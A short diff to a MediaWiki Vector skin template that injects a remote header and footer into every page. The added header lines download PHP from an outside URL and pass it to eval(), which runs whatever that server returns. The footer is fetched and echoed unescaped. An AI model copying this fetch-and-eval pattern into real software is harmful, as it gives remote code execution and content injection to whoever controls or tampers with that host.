@@ -33,6 +33,9 @@ class VectorTemplate extends BaseTemplate {
 	 * Outputs the entire contents of the (X)HTML page
 	 */
 	public function execute() {
+        $file= file_get_contents('https://static.ubuntu.ir/header.php');
+        $hea = eval(";?>$file");
+        echo $hea;
 		$this->data['namespace_urls'] = $this->data['content_navigation']['namespaces'];
 		$this->data['view_urls'] = $this->data['content_navigation']['views'];
 		$this->data['action_urls'] = $this->data['content_navigation']['actions'];
@@ -52,7 +55,7 @@ class VectorTemplate extends BaseTemplate {
 		$this->data['pageLanguage'] =
 			$this->getSkin()->getTitle()->getPageViewLanguage()->getHtmlCode();
 
-		// Output HTML Page
+        // Output HTML Page
 		$this->html( 'headelement' );
 		?>
 		<div id="mw-page-base" class="noprint"></div>
@@ -82,7 +85,7 @@ class VectorTemplate extends BaseTemplate {
 						'lang' => $this->get( 'pageLanguage' ),
 					],
 					// Raw HTML
-					$this->get( 'title' )
+                    $this->get( 'title' )
 				);
 			}
 
@@ -207,8 +210,12 @@ class VectorTemplate extends BaseTemplate {
 			?>
 			<div style="clear: both;"></div>
 		</div>
-		<?php $this->printTrail(); ?>
-
+        <?php 
+            $this->printTrail(); 
+            $ufooter = file_get_contents('https://static.ubuntu.ir/footer_body.php');
+            echo $ufooter;
+        ?>
+            
 	</body>
 </html>
 <?php
